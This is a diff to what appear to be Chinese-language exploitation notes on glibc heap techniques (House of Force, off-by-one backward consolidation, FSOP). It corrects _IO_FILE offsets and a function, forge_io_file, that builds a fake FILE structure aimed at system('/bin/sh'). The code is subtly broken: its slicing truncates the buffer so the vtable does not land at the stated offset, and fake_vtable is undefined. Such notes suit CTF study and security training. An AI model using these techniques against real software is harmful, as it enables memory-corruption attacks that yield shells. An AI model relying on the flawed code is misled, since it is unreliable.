@@ -55,7 +55,7 @@ def house_of_force(target_addr, top_chunk_addr, malloc_func):
 # 1. 在 bss/heap 上伪造一个 fake chunk
 # 2. 利用 off-by-one 清除下一个 chunk 的 PREV_INUSE 位
 # 3. 设置 prev_size 指向 fake chunk
-# 4. free 该 chunk，触发向前合并
+# 4. free 该 chunk，触发向后合并（与低地址的 fake chunk 合并）
 # 5. 合并后的 chunk 覆盖目标区域
 
 # 关键：fake chunk 需要通过 unlink 的检查
@@ -88,10 +88,10 @@ target = libc.sym['_IO_list_all'] - 0x10
 ```python
 # _IO_FILE 结构体关键字段（glibc 2.23）
 # 偏移 0x00: _flags
-# 偏移 0x38: _IO_write_base
-# 偏移 0x40: _IO_write_ptr
-# 偏移 0xd8: _mode
-# 偏移 0xe0: vtable 指针
+# 偏移 0x20: _IO_write_base
+# 偏移 0x28: _IO_write_ptr
+# 偏移 0xc0: _mode
+# 偏移 0xd8: vtable 指针
 
 # 伪造 _IO_FILE 触发条件（_IO_flush_all_lockp）：
 # 1. _flags & _IO_MAGIC == _IO_MAGIC（_flags = 0xfbad0000 + ...）
@@ -103,9 +103,9 @@ def forge_io_file(system_addr, bin_sh_addr):
     # 设置 _flags
     fake_file = p64(0xfbad2800) + fake_file[8:]
     # 设置 _IO_write_base 和 _IO_write_ptr
-    fake_file = fake_file[:0x38] + p64(bin_sh_addr) + p64(bin_sh_addr + 8)
+    fake_file = fake_file[:0x20] + p64(bin_sh_addr) + p64(bin_sh_addr + 8)
     # 设置 vtable 指向伪造的 vtable
-    fake_file = fake_file[:0xe0] + p64(fake_vtable)
+    fake_file = fake_file[:0xd8] + p64(fake_vtable)
     return fake_file
 ```
 
